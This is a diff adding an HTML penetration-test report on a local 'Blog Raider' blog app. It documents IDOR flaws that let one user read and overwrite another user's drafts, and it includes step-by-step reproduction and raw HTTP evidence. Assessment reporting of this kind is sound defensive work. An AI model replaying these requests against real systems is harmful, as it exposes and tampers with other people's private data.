@@ -1,0 +1,1073 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqzc4w2r-5qv33w</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [idor] IDOR / BOLA: any user's private drafts readable via /{username}/drafts</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [idor-write] IDOR write: any authenticated user can overwrite another user's draft via POST /edit_draft/{id}</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [idor] IDOR: any authenticated user can read another user's private draft via /edit_draft/{id}</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#f57c00">MEDIUM</span> [idor] Broken access control: non-admin user can read the admin's private drafts via /admin/drafts</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] Outdated &amp; EOL Python 3.8.17 runtime — multiple known CVEs (CVE-2024-7592, CVE-2024-8088, CVE-2024-6232, CVE-2024-0397, CVE-2024-4032, CVE-2023-40217)</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Username enumeration via registration error message</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqzc4w2r-5qv33w</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:5003/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T14:50:50.973Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>13 mapped · 12 scanned · 1 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>6</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:5003</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>6 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">2</b> high</span><span><b style="color:#f57c00">3</b> medium</span><span><b style="color:#c9a227">1</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [idor] IDOR / BOLA: any user's private drafts readable via /{username}/drafts</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The drafts listing is served at a username-templated path /{username}/drafts and performs NO ownership check against the authenticated session. Logged in as low-privileged user 'test', requesting /admin/drafts returns admin's private drafts (&quot;admin's Drafts&quot;, draft &quot;admin_draft&quot;, and the edit link /edit_draft/1) — data belonging to another (administrative) user. Any authenticated user can enumerate and read any other user's private drafts (and discover their draft IDs for the /edit_draft/{id} endpoint) simply by substituting the username in the path. This is a Broken Object-Level Authorization (IDOR) flaw. Note: the endpoint itself does enforce authentication (unauth requests 302-redirect to login), so this is broken access control between users, not an auth bypass.</div>
+<div><b>Reproduction</b></div><pre>1. Authenticate as low-priv user 'test' (session cookie attached automatically). Baseline GET /test/drafts → 200, shows only &quot;test's Drafts&quot; (ev-mqzd11oh-29).
+2. Negative control: GET /nonexistentuser_zzz999/drafts → 404 Not Found, 207 bytes (ev-mqzd1gwq-2b) — distinguishable failure.
+3. Attack (positive #1): GET /admin/drafts as session 'test' → 200, 1370 bytes, body contains &quot;admin's Drafts&quot; + &quot;admin_draft&quot; + /edit_draft/1 (ev-mqzd1gb8-2a).
+4. Attack (positive #2, repro): GET /admin/drafts again → identical 200 admin content (ev-mqzd1pyf-2c).
+Result: cross-user private draft data is returned despite no ownership relationship between 'test' and 'admin'.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzd1gwq-2b</code> — <code>artifacts/s-0005/ev-mqzd1gwq-2b/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistentuser_zzz999/drafts HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:16:10 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzd1gb8-2a</code> — <code>artifacts/s-0005/ev-mqzd1gb8-2a/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/drafts HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1370
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:16:09 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;admin's Drafts&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;admin's Drafts&lt;/h2&gt;
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+            &lt;li class=&quot;list-group-item&quot;&gt;
+                &lt;h3&gt;admin_draft&lt;/h3&gt;  
+                &lt;a href=&quot;/edit_draft/1&quot; class=&quot;btn btn-primary&quot;&gt;View and Edit&lt;/a&gt;
+            &lt;/li&gt;
+        
+    &lt;/ul&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzd1pyf-2c</code> — <code>artifacts/s-0005/ev-mqzd1pyf-2c/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/drafts HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1370
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:16:22 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;admin's Drafts&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;admin's Drafts&lt;/h2&gt;
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+            &lt;li class=&quot;list-group-item&quot;&gt;
+                &lt;h3&gt;admin_draft&lt;/h3&gt;  
+                &lt;a href=&quot;/edit_draft/1&quot; class=&quot;btn btn-primary&quot;&gt;View and Edit&lt;/a&gt;
+            &lt;/li&gt;
+        
+    &lt;/ul&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [idor-write] IDOR write: any authenticated user can overwrite another user's draft via POST /edit_draft/{id}</h3>
+<div class="kv">Screen: <code>s-0008</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">POST /edit_draft/{id} enforces no ownership check. The 'test' user (who owns only drafts 2,3,4) POSTed new content to draft 1 (owned by admin) and the server accepted it (302 → /test/drafts). Subsequent GET /edit_draft/1 confirms the injected content persisted: marker &quot;VERDICT-IDORW-A-mqzd&quot; then &quot;VERDICT-IDORW-B-mqzd&quot; both replaced admin's draft body. Because the id is a sequential integer, any authenticated user can tamper with or destroy every other user's drafts. A POST to a non-existent id (99999) returns 404, proving the write only succeeds against a real cross-user object.</div>
+<div><b>Reproduction</b></div><pre>1. Log in as 'test'. 2. POST /edit_draft/1 with body title=admin_draft&amp;content=VERDICT-IDORW-A-mqzd&amp;submit=Submit → 302 redirect (accepted). 3. GET /edit_draft/1 → textarea now contains VERDICT-IDORW-A-mqzd. 4. Repeat with marker B → GET reflects marker B. 5. Negative control: POST /edit_draft/99999 → 404, no write. Ownership is never enforced on the path id for writes.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdbd0v-32</code> — <code>artifacts/s-0008/ev-mqzdbd0v-32/</code></div><div class="lbl">REQUEST</div><pre>POST /edit_draft/99999 HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+title=admin_draft&amp;content=VERDICT-IDORW-NEGCTRL&amp;submit=Submit</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:23:51 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdbiu5-34</code> — <code>artifacts/s-0008/ev-mqzdbiu5-34/</code></div><div class="lbl">REQUEST</div><pre>GET /edit_draft/1 HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1888
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:23:59 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Edit Draft&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;Edit Draft&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/edit_draft/1&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;title&quot;&gt;Title&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;title&quot; maxlength=&quot;100&quot; minlength=&quot;1&quot; name=&quot;title&quot; required type=&quot;text&quot; value=&quot;admin_draft&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;content&quot;&gt;Content&lt;/label&gt;
+            &lt;textarea class=&quot;form-control form-control-lg&quot; id=&quot;content&quot; name=&quot;content&quot; required&gt;
+VERDICT-IDORW-A-mqzd&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Save Draft&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdbxc4-36</code> — <code>artifacts/s-0008/ev-mqzdbxc4-36/</code></div><div class="lbl">REQUEST</div><pre>GET /edit_draft/1 HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1888
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:24:18 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Edit Draft&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;Edit Draft&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/edit_draft/1&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;title&quot;&gt;Title&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;title&quot; maxlength=&quot;100&quot; minlength=&quot;1&quot; name=&quot;title&quot; required type=&quot;text&quot; value=&quot;admin_draft&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;content&quot;&gt;Content&lt;/label&gt;
+            &lt;textarea class=&quot;form-control form-control-lg&quot; id=&quot;content&quot; name=&quot;content&quot; required&gt;
+VERDICT-IDORW-B-mqzd&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Save Draft&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [idor] IDOR: any authenticated user can read another user's private draft via /edit_draft/{id}</h3>
+<div class="kv">Screen: <code>s-0008</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The edit-draft page at GET /edit_draft/{id} performs no ownership check on the draft id. The 'test' user owns only drafts 2, 3, 4 (per /test/drafts), yet GET /edit_draft/1 returns the edit form pre-populated with another user's private draft (title &quot;admin_draft&quot;). The draft id is a sequential integer (object_ref), so any authenticated user can enumerate and read other users' unpublished drafts. A non-existent id (99999) correctly 404s, proving the 200+content for id 1 is genuine cross-user data exposure rather than a catch-all.</div>
+<div><b>Reproduction</b></div><pre>1. Log in as 'test' (owns drafts 2,3,4). 2. GET /edit_draft/1 → 200, form value=&quot;admin_draft&quot; (a draft not owned by test). 3. Repeat → stable. 4. Negative control GET /edit_draft/99999 → 404, no draft content. Ownership is never enforced on the path id.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdaffd-30</code> — <code>artifacts/s-0008/ev-mqzdaffd-30/</code></div><div class="lbl">REQUEST</div><pre>GET /edit_draft/99999 HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:23:08 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzd9vz0-2y</code> — <code>artifacts/s-0008/ev-mqzd9vz0-2y/</code></div><div class="lbl">REQUEST</div><pre>GET /edit_draft/1 HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1869
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:22:43 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Edit Draft&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/logout&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        
+            
+        
+        
+    &lt;h2&gt;Edit Draft&lt;/h2&gt;
+    &lt;form method=&quot;POST&quot; action=&quot;/edit_draft/1&quot;&gt;
+        
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;title&quot;&gt;Title&lt;/label&gt;
+            &lt;input class=&quot;form-control form-control-lg&quot; id=&quot;title&quot; maxlength=&quot;100&quot; minlength=&quot;1&quot; name=&quot;title&quot; required type=&quot;text&quot; value=&quot;admin_draft&quot;&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label class=&quot;form-control-label&quot; for=&quot;content&quot;&gt;Content&lt;/label&gt;
+            &lt;textarea class=&quot;form-control form-control-lg&quot; id=&quot;content&quot; name=&quot;content&quot; required&gt;
+&lt;/textarea&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+            &lt;input class=&quot;btn btn-primary btn-lg btn-block&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Save Draft&quot;&gt;
+        &lt;/div&gt;
+    &lt;/form&gt;
+
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzdafyw-31</code> — <code>artifacts/s-0008/ev-mqzdafyw-31/</code></div><div class="lbl">REQUEST</div><pre>GET /edit_draft/1 HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1869
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:23:09 GMT
+server: Werkzeug/3.0.6 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Edit Draft&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot;  &gt;Blog Raider&lt;/a&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot;&gt;
+            &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+                
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/create_draft&quot;&gt;Create Draft&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/dashboard&quot;&gt;My Drafts&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
